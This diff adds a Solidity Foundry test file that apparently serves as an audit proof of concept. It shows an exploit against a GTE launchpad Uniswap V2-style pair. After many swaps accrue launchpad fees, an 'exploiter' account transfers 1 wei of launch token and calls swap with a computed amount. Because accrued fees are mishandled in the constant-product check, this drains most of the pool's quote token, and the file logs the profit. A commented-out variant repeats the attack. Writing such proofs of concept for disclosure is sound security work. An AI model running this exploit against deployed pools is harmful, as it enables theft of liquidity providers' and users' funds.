@@ -1,0 +1,378 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./LaunchpadTestBase.sol";
+import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";
+import "contracts/launchpad/libraries/RewardsTracker.sol";
+import {UniswapV2Library, IUniswapV2Pair} from "@gte-univ2-periphery/UniswapV2Library.sol";
+import {IUniswapV2Factory} from "@gte-univ2-core/interfaces/IUniswapV2Factory.sol";
+import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
+import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
+import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
+import {Distributor, IGTELaunchpadV2Pair} from "contracts/launchpad/Distributor.sol";
+
+contract PoCLaunchpad is LaunchpadTestBase {
+    using SafeTransferLib for address;
+
+    GTELaunchpadV2PairFactory v2Factory;
+    GTELaunchpadV2Pair pair;
+
+    /// @notice Setup normal GTELaunchpadV2Pair with 40ETH and 200M launch token
+    /// A huge 100 swaps taking place on same block. This provide lots of accrued fee
+    /// Exploiter will try to stealing token by be the first to call next block
+    function test_debug_submissionValidity() external {
+        //1. we create custom GTE pair with same config as LaunchPad uniswap pair
+        //@note base test Mock Uniswap still implemented with LaunchPad. we just create another pair token to exist alongside with it. Distributor still work well
+        //200M launchToken and 40 ETH liquidity
+        //Distributor still taking rewards and share it with users
+        {
+            v2Factory = new GTELaunchpadV2PairFactory(
+                address(0), address(launchpad), address(launchpadLPVault), address(distributor)
+            );
+            vm.prank(address(launchpad));
+            v2Factory.createPair(token, address(quoteToken));
+
+            address pairAddr = v2Factory.getPair(token, address(quoteToken));
+
+            require(pairAddr != address(0), "Pair address should not be zero");
+            require(IERC20(pairAddr).totalSupply() == 0, "Liquidity supply should be 0");
+
+            //Mock LaunchPad graduate mint liquidity to the pair
+            // 200M LaunchToken and 40 ETH
+            deal(address(quoteToken), address(pairAddr), 40 ether);
+            deal(token, address(pairAddr), 200_000_000 ether);
+
+            IUniswapV2Pair(pairAddr).mint(address(launchpadLPVault));
+            console.log("liquidity supply after mint %e", IERC20(pairAddr).balanceOf(address(launchpadLPVault)));
+            pair = GTELaunchpadV2Pair(pairAddr);
+
+            vm.assertEq(pair.rewardsPoolActive(), 1, "pair should be in reward pool active mode");
+            vm.assertNotEq(
+                pair.launchpadFeeDistributor(), address(0), "pair should have a valid launchpad fee distributor"
+            );
+        }
+
+        //2. Developer try to launch token by spending 40 ETH to reach graduate phase
+        // dev get 800M token shares
+        // Distributor start tracking rewards with users
+        {
+            fundAndApproveUser(dev, 100 ether);
+            ILaunchpad.LaunchData memory launchdata = launchpad.launches(token);
+            vm.assertTrue(launchdata.active, "Token is in launch/bonding mode");
+            console.log("developer buy 800M token to graduate token pair to uniswap pair");
+            buyLaunchToken(token, dev, 4e26); // buy all token so it graduate. already prank inside
+            buyLaunchToken(token, dev, 4e26); // buy all token so it graduate. already prank inside
+            launchdata = launchpad.launches(token);
+
+            RewardPoolDataMemory memory rpd = Distributor(distributor).getRewardsPoolData(token);
+            vm.assertEq(rpd.totalShares, 8e26, "totalFeeShare should be 800M after graduate");
+            vm.assertFalse(launchdata.active, "graduated so disable launch mode");
+            vm.assertTrue(LaunchToken(token).unlocked(), "graduated so token unlocked");
+        }
+
+        //3. User swapping with GTELaunchpadV2Pair
+        // 100 swaps back and forth from 100 ETH to Launch token and backward
+        {
+            fundAndApproveUser(user, 100 ether);
+            console.log("user quoteBalance: %e", quoteToken.balanceOf(user));
+            vm.startPrank(user);
+            IERC20(token).approve(address(pair), type(uint256).max);
+            IERC20(address(quoteToken)).approve(address(pair), type(uint256).max);
+            debugAccruedFeeAndReserve(pair);
+            uint256 swapcount = 200; // 0.3% fee each swap
+            console.log("user start swap back and forth %d times", swapcount);
+            for (uint256 i = 0; i < swapcount; i++) {
+                // console.log("---- swap round %d ----", i + 1);
+                //swap all quotetoken to launchToken
+                swapQuoteToToken(user, quoteToken.balanceOf(user));
+                //swap back
+                swapTokenToQuote(user, IERC20(token).balanceOf(user));
+            }
+
+            //skim to prevent any mishap. prove all swap is in fact correct and does not inflate anything
+            pair.skim(user); //try withdraw
+            console.log("user quoteBalance: %e", quoteToken.balanceOf(user));
+            debugAccruedFeeAndReserve(pair);
+            vm.stopPrank();
+        }
+
+        {
+            address exploiter = makeAddr("exploiter");
+            
+            fundAndApproveUser(exploiter, 1 ether);
+            vm.startPrank(exploiter);
+            IERC20(token).approve(address(pair), type(uint256).max);
+            IERC20(address(quoteToken)).approve(address(pair), type(uint256).max);
+
+            
+            swapQuoteToToken(exploiter, 1e5);// get some launch token
+
+            vm.assertEq(pair.token0(), address(quoteToken), "This test only work if pair Token0 is quoteToken");
+
+            (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+            uint256 accruedFee0 = pair.accruedLaunchpadFee0();
+            uint256 accruedFee1 = pair.accruedLaunchpadFee1();
+
+            // k1 = x* y = (quoteToken.balanceOf() * 1000 - quoteTokenIn * 3)  * (token.balanceOf() * 1000 - baseTokenIn * 3)
+            // k2 = reserve0 * reserve1 * 1000 * 1000
+            // require(k1 < k2)
+            // we reduce reserve0 to 1. by taking away all quoteToken.
+            // balance still include accruedFee.
+            // k1 = 9.78e18 * 1000 * 2e26 * 1000
+            // k2 = x       * 2e26 * 1000 * 1000
+            // k1< k2 when x > accruedFee ?
+
+            console.log("-exploiter quoteBalance: %e", quoteToken.balanceOf(exploiter));
+            //we swap 1 wei of launch token and withdraw most of quote token
+            uint256 tokenIn = 1;
+            IERC20(token).transfer(address(pair), tokenIn);
+            uint256 k2 = uint256(reserve0) * uint256(reserve1) * 1000 ** 2;
+            console.log("k2 %e", k2);
+            uint256 balance1Adjusted = IERC20(token).balanceOf(address(pair)) * 1000 - ((tokenIn + accruedFee1) * 3);
+            uint256 balance0Adjusted = (k2 / balance1Adjusted);
+            //give extra boost due to rounding issue
+            balance0Adjusted += 1e5;
+            uint256 k1 = balance0Adjusted * balance1Adjusted;
+            console.log("k1 %e", k1);
+            console.log("balance0 %e", balance0Adjusted); //5.0501186591961276120602e22
+            console.log("balance1 %e", balance1Adjusted); //5.050118659196127612123e22
+            // balance0Adjusted = (new_balance0) * 1000 - (accruedFee0 * 3)
+            //new_balance0 = current quote balance - x_swap_amount
+            uint256 x_swapAmount = quoteToken.balanceOf(address(pair)) - (balance0Adjusted + accruedFee0 * 3) / 1000;
+
+            skip(30);//@move to next block to show exploit
+            pair.swap(x_swapAmount, 0, exploiter, new bytes(0));
+            debugAccruedFeeAndReserve(pair);
+            console.log("-exploiter quoteBalance: %e", quoteToken.balanceOf(exploiter));
+            console.log("exploiter profit: %e", quoteToken.balanceOf(exploiter) - 1 ether);
+            vm.stopPrank();
+
+        }
+
+
+    }
+
+    /// @notice This is exploration test, to check if there is any other possible exploit. Keeping for reference
+    // function test_debug_submissionValidity() external {
+
+    //     //1. we create custom GTE pair with same config as LaunchPad uniswap pair
+    //     //200M launchToken and 40 ETH liquidity
+    //     //Distributor still taking rewards and share it with users
+    //     {
+    //         v2Factory = new GTELaunchpadV2PairFactory(
+    //             address(0), address(launchpad), address(launchpadLPVault), address(distributor)
+    //         );
+    //         vm.prank(address(launchpad));
+    //         v2Factory.createPair(token, address(quoteToken));
+
+    //         address pairAddr = v2Factory.getPair(token, address(quoteToken));
+
+    //         require(pairAddr != address(0), "Pair address should not be zero");
+    //         require(IERC20(pairAddr).totalSupply() == 0, "Liquidity supply should be 0");
+
+    //         //Mock LaunchPad graduate mint liquidity to the pair
+    //         // 200M LaunchToken and 40 ETH
+    //         deal(address(quoteToken), address(pairAddr), 40 ether);
+    //         deal(token, address(pairAddr), 200_000_000 ether);
+
+    //         IUniswapV2Pair(pairAddr).mint(address(launchpadLPVault));
+    //         console.log("liquidity supply after mint %e", IERC20(pairAddr).balanceOf(address(launchpadLPVault)));
+    //         pair = GTELaunchpadV2Pair(pairAddr);
+
+    //         vm.assertEq(pair.rewardsPoolActive(), 1, "pair should be in reward pool active mode");
+    //         vm.assertNotEq(
+    //             pair.launchpadFeeDistributor(), address(0), "pair should have a valid launchpad fee distributor"
+    //         );
+    //     }
+    //     //2. Create token pair from LaunchPad by graduate token
+    //     // dev get 800M token shares
+    //     // Distributor track rewards with users
+    //     {
+    //         fundAndApproveUser(dev, 100 ether);
+    //         ILaunchpad.LaunchData memory launchdata = launchpad.launches(token);
+    //         vm.assertTrue(launchdata.active, "Token is in launch/bonding mode");
+    //         console.log("developer buy 800M token to graduate token pair to uniswap pair");
+    //         buyLaunchToken(token, dev, 4e26); // buy all token so it graduate. already prank inside
+    //         buyLaunchToken(token, dev, 4e26); // buy all token so it graduate. already prank inside
+    //         launchdata = launchpad.launches(token);
+
+    //         RewardPoolDataMemory memory rpd = Distributor(distributor).getRewardsPoolData(token);
+    //         vm.assertEq(rpd.totalShares, 8e26, "totalFeeShare should be 800M after graduate");
+    //         vm.assertFalse(launchdata.active, "graduated so disable launch mode");
+    //         vm.assertTrue(LaunchToken(token).unlocked(), "graduated so token unlocked");
+    //     }
+    //     //3. User with ETH and launchtoken ready to swap and exploit
+    //     {
+    //         fundAndApproveUser(user, 100 ether);
+    //         console.log("user quoteBalance: %e", quoteToken.balanceOf(user));
+    //         vm.startPrank(user);
+    //         IERC20(token).approve(address(pair), type(uint256).max);
+    //         IERC20(address(quoteToken)).approve(address(pair), type(uint256).max);
+    //         debugAccruedFeeAndReserve(pair);
+    //         uint256 swapcount = 200; // 0.3% fee each swap
+    //         console.log("user start swap back and forth %d times", swapcount);
+    //         for (uint256 i = 0; i < swapcount; i++) {
+    //             // console.log("---- swap round %d ----", i + 1);
+    //             //swap all quotetoken to launchToken
+    //             swapQuoteToToken(user, quoteToken.balanceOf(user));
+    //             //swap back
+    //             swapTokenToQuote(user, IERC20(token).balanceOf(user));
+    //         }
+
+    //         //get small amount of Launch token
+    //         swapQuoteToToken(user, 1e5);
+    //         pair.skim(user); //try withdraw
+    //         console.log("user quoteBalance: %e", quoteToken.balanceOf(user));
+    //         debugAccruedFeeAndReserve(pair);
+    //     }
+
+    //     {
+    //         vm.assertEq(pair.token0(), address(quoteToken), "This test only work if Token0 is quoteToken");
+
+    //         (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+    //         uint256 accruedFee0 = pair.accruedLaunchpadFee0();
+    //         uint256 accruedFee1 = pair.accruedLaunchpadFee1();
+    //         // reducing reserve0 to very low point
+    //         // uint256 minimumReserve0 = 1;
+    //         // uint256 quoteTokenOut = reserve0 - accruedFee0 - minimumReserve0;
+    //         // uint256 baseAmountIn = UniswapV2Library.getAmountIn(quoteTokenOut, reserve1, reserve0);
+    //         // k1 = x* y = (quoteToken.balanceOf() * 1000 - quoteTokenIn * 3)  * (token.balanceOf() * 1000 - baseTokenIn * 3)
+    //         // k2 = reserve0 * reserve1 * 1000 * 1000
+    //         // require(k1 < k2)
+    //         // we reduce reserve0 to 1. by taking away all quoteToken.
+    //         // balance still include accruedFee.
+    //         // k1 = 9.78e18 * 1000 * 2e26 * 1000
+    //         // k2 = x       * 2e26 * 1000 * 1000
+    //         // k1< k2 when x > accruedFee ?
+
+    //         console.log("-user quoteBalance: %e", quoteToken.balanceOf(user));
+    //         //we swap 1 wei of launch token and withdraw most of quote token
+    //         uint256 tokenIn = 1;
+    //         IERC20(token).transfer(address(pair), tokenIn);
+    //         uint256 k2 = uint256(reserve0) * uint256(reserve1) * 1000 ** 2;
+    //         console.log("k2 %e", k2);
+    //         uint256 balance1Adjusted = IERC20(token).balanceOf(address(pair)) * 1000 - ((tokenIn + accruedFee1) * 3);
+    //         uint256 balance0Adjusted = (k2 / balance1Adjusted);
+    //         //give extra boost due to rounding issue
+    //         balance0Adjusted += 1e5;
+    //         uint256 k1 = balance0Adjusted * balance1Adjusted;
+    //         console.log("k1 %e", k1);
+    //         console.log("balance0 %e", balance0Adjusted); //5.0501186591961276120602e22
+    //         console.log("balance1 %e", balance1Adjusted); //5.050118659196127612123e22
+    //         // balance0Adjusted = (new_balance0) * 1000 - (accruedFee0 * 3)
+    //         //new_balance0 = current quote balance - x_swap_amount
+    //         uint256 x_swapAmount = quoteToken.balanceOf(address(pair)) - (balance0Adjusted + accruedFee0 * 3) / 1000;
+    //         pair.swap(x_swapAmount, 0, user, new bytes(0));
+    //         debugAccruedFeeAndReserve(pair);
+    //         console.log("-user quoteBalance: %e", quoteToken.balanceOf(user));
+    //     }
+    //     {
+    //         // try push single reserve to tiny number
+    //         (uint112 reserve0, uint112 reserve1,) = pair.getReserves();//token0 = quote, token1 = launchToken
+    //         uint256 accruedFee0 = pair.accruedLaunchpadFee0();
+    //         uint256 accruedFee1 = pair.accruedLaunchpadFee1();
+
+    //         uint256 amount1Out = uint(reserve1) - accruedFee1 - 1; //leave 1 wei of launch token
+    //         uint256 amount0In = UniswapV2Library.getAmountIn(amount1Out, reserve0, reserve1);
+    //         deal(address(quoteToken), user, amount0In);
+    //         console.log("try push reserve1 to tiny number by swap in %e quote token for %e launch token", amount0In, amount1Out);
+    //         quoteToken.transfer(address(pair), amount0In);
+    //         pair.swap(0, amount1Out, user, new bytes(0));
+    //         debugAccruedFeeAndReserve(pair);
+    //     }
+    //     {
+    //         // deal(address(quoteToken), user, userFeeRewards0);
+    //         // deal(token, user, userFeeRewards1);
+    //         // deal(token, user, 4e26);
+
+    //         // swapTokenToQuote(user, IERC20(token).balanceOf(user));
+    //         // console.log("user quoteBalance: %e", quoteToken.balanceOf(user));
+    //         // //now k = x * y is balanced.
+    //         // // what if user also have 400M token from launch and receive half of the fee
+    //         // skip(30);
+    //         // uint userFeeRewards0 = pair.accruedLaunchpadFee0() /2;
+    //         // uint userFeeRewards1 = pair.accruedLaunchpadFee1() /2;
+    //         // //force update by swap small amount
+    //         // IERC20(token).transfer(address(pair), 10);
+    //         // pair.swap(1,0, user, new bytes(0));
+    //         // debugAccruedFeeAndReserve(pair);
+    //     }
+    //     vm.stopPrank();
+    // }
+
+    function debugAccruedFeeAndReserve(GTELaunchpadV2Pair pair) internal view {
+        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+        console.log("-- Debug Pair Reserve--");
+        console.log("pair reserve0 %e", reserve0);
+        console.log("pair balance0 %e", IERC20(pair.token0()).balanceOf(address(pair)));
+        console.log("pair reserve1 %e", reserve1);
+        console.log("pair balance1 %e", IERC20(pair.token1()).balanceOf(address(pair)));
+        console.log("pair accruedLaunchpadFee0 %e", pair.accruedLaunchpadFee0());
+        console.log("pair accruedLaunchpadFee1 %e", pair.accruedLaunchpadFee1());
+        console.log("");
+    }
+
+    function fundAndApproveUser(address _user, uint256 amount) internal {
+        vm.startPrank(_user);
+        quoteToken.mint(_user, amount);
+        quoteToken.approve(address(launchpad), type(uint256).max);
+        ERC20Harness(token).approve(address(launchpad), type(uint256).max);
+        quoteToken.approve(address(uniV2Router), type(uint256).max);
+        ERC20Harness(token).approve(address(uniV2Router), type(uint256).max);
+        vm.stopPrank();
+    }
+
+    function buyLaunchToken(address _token, address fromUser, uint256 amountOutBase) internal {
+        vm.startPrank(fromUser);
+        launchpad.buy(
+            ILaunchpad.BuyData({
+                account: fromUser,
+                token: _token,
+                recipient: fromUser,
+                amountOutBase: amountOutBase,
+                maxAmountInQuote: type(uint256).max
+            })
+        );
+        vm.stopPrank();
+    }
+
+    function sellLaunchToken(address _token, address fromUser, uint256 amountInBase) internal {
+        vm.startPrank(fromUser);
+        launchpad.sell(fromUser, _token, fromUser, amountInBase, 0);
+        vm.stopPrank();
+    }
+
+    function swapTokenToQuote(address receiver, uint256 baseAmountIn) internal {
+        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = pair.getReserves();
+        //we consider token0 is launchToken, token1 is quoteToken
+        if (pair.token0() == address(token)) {
+            uint256 amountOut = UniswapV2Library.getAmountOut(baseAmountIn, reserve0, reserve1);
+            // console.log("swapTokenToQuote baseAmountIn %e for quoteAmountOut %e", baseAmountIn, amountOut);
+            pair.token0().safeTransfer(address(pair), baseAmountIn);
+            pair.swap(0, amountOut, receiver, new bytes(0));
+        } else {
+            //token0 is quoteToken, token1 is launchToken
+            uint256 amountOut = UniswapV2Library.getAmountOut(baseAmountIn, reserve1, reserve0);
+            // console.log("swapTokenToQuote baseAmountIn %e for quoteAmountOut %e", baseAmountIn, amountOut);
+            pair.token1().safeTransfer(address(pair), baseAmountIn);
+            pair.swap(amountOut, 0, receiver, new bytes(0));
+        }
+    }
+
+    function swapQuoteToToken(address receiver, uint256 quoteAmountIn) internal {
+        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = pair.getReserves();
+        //we consider token0 is launchToken, token1 is quoteToken
+        if (pair.token1() == address(quoteToken)) {
+            uint256 amountOut = UniswapV2Library.getAmountOut(quoteAmountIn, reserve1, reserve0);
+            // console.log("swapQuoteToToken quoteAmountIn %e for baseAmountOut %e", quoteAmountIn, amountOut);
+            pair.token1().safeTransfer(address(pair), quoteAmountIn);
+            pair.swap(amountOut, 0, receiver, new bytes(0));
+        } else {
+            //token0 is quoteToken, token1 is launchToken
+            uint256 amountOut = UniswapV2Library.getAmountOut(quoteAmountIn, reserve0, reserve1);
+            // console.log("swapQuoteToToken quoteAmountIn %e for baseAmountOut %e", quoteAmountIn, amountOut);
+            pair.token0().safeTransfer(address(pair), quoteAmountIn);
+            pair.swap(0, amountOut, receiver, new bytes(0));
+        }
+    }
+}
